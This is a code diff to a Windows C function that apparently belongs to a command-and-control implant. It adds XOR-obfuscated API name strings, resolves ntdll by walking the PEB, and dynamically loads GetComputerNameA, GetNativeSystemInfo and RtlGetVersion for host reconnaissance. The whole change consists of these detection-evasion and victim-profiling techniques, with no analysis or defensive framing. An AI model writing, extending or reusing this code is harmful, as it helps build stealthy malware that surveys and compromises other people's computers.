@@ -249,7 +249,12 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_InitializeConditionVariable[] = {19, 52, 51, 46, 51, 59, 54, 51, 32, 63, 25, 53, 52, 62, 51, 46, 51, 53, 52, 12, 59, 40, 51, 59, 56, 54, 63};
   static const unsigned char enc_SleepConditionVariableCS[] = {9, 54, 63, 63, 42, 25, 53, 52, 62, 51, 46, 51, 53, 52, 12, 59, 40, 51, 59, 56, 54, 63, 25, 9};
   static const unsigned char enc_WakeConditionVariable[] = {13, 59, 49, 63, 25, 53, 52, 62, 51, 46, 51, 53, 52, 12, 59, 40, 51, 59, 56, 54, 63};
+  static const unsigned char enc_GetComputerNameA[] = {29, 63, 46, 25, 53, 55, 42, 47, 46, 63, 40, 20, 59, 55, 63, 27};
+  static const unsigned char enc_GetNativeSystemInfo[] = {29, 63, 46, 20, 59, 46, 51, 44, 63, 9, 35, 41, 46, 63, 55, 19, 52, 60, 53};
 
+  /* ntdll functions */
+  static const unsigned char enc_ntdll_dll[] = {52, 46, 62, 54, 54, 116, 62, 54, 54};
+  static const unsigned char enc_RtlGetVersion[] = {8, 46, 54, 29, 63, 46, 12, 63, 40, 41, 51, 53, 52};
 
   /* advapi32 functions */
   static const unsigned char enc_SystemFunction036[] = {9, 35, 41, 46, 63, 55, 28, 47, 52, 57, 46, 51, 53, 52, 106, 105, 108};
@@ -285,7 +290,7 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_wer_dll[] = {45, 63, 40, 104, 62, 54, 54};
   static const unsigned char enc_WerSetFlags[] = {85, 63, 40, 89, 63, 62, 124, 54, 59, 61, 41};
 
-  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32], dll_wer[32], dll_gdi32[32], dll_ole32[32], dll_gdiplus[32];
+  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32], dll_wer[32], dll_gdi32[32], dll_ole32[32], dll_gdiplus[32], dll_ntdll[32];
   c2t_win32_xor_decode(dll_user32, enc_user32_dll, sizeof(enc_user32_dll), 0x5A);
   c2t_win32_xor_decode(dll_kernel32, enc_kernel32_dll, sizeof(enc_kernel32_dll), 0x5A);
   c2t_win32_xor_decode(dll_advapi32, enc_advapi32_dll, sizeof(enc_advapi32_dll), 0x5A);
@@ -297,6 +302,10 @@ void c2t_win32_api_init(void) {
   c2t_win32_xor_decode(dll_gdi32, enc_gdi32_dll, sizeof(enc_gdi32_dll), 0x5A);
   c2t_win32_xor_decode(dll_ole32, enc_ole32_dll, sizeof(enc_ole32_dll), 0x5A);
   c2t_win32_xor_decode(dll_gdiplus, enc_gdiplus_dll, sizeof(enc_gdiplus_dll), 0x5A);
+  c2t_win32_xor_decode(dll_ntdll, enc_ntdll_dll, sizeof(enc_ntdll_dll), 0x5A);
+
+  HMODULE hNtdll = c2t_win32_get_module_peb(L"ntdll.dll");
+  if (!hNtdll) hNtdll = GetModuleHandleA(dll_ntdll);
 
   HMODULE hKernel32 = c2t_win32_get_module_peb(L"kernel32.dll");
   if (!hKernel32) hKernel32 = GetModuleHandleA(dll_kernel32);
@@ -474,12 +483,16 @@ void c2t_win32_api_init(void) {
   LOAD_API(hKernel32, InitializeConditionVariable, enc_InitializeConditionVariable);
   LOAD_API(hKernel32, SleepConditionVariableCS, enc_SleepConditionVariableCS);
   LOAD_API(hKernel32, WakeConditionVariable, enc_WakeConditionVariable);
+  LOAD_API(hKernel32, GetComputerNameA, enc_GetComputerNameA);
+  LOAD_API(hKernel32, GetNativeSystemInfo, enc_GetNativeSystemInfo);
   LOAD_API(hKernel32, SetDefaultDllDirectories, enc_SetDefaultDllDirectories);
 
   if (g_c2t_win32.SetDefaultDllDirectories) {
     g_c2t_win32.SetDefaultDllDirectories(0x00000800U); /* LOAD_LIBRARY_SEARCH_SYSTEM32 */
   }
 
+  /* ntdll */
+  LOAD_API(hNtdll, RtlGetVersion, enc_RtlGetVersion);
 
   /* advapi32 */
   LOAD_API(hAdvapi32, RtlGenRandom, enc_SystemFunction036);
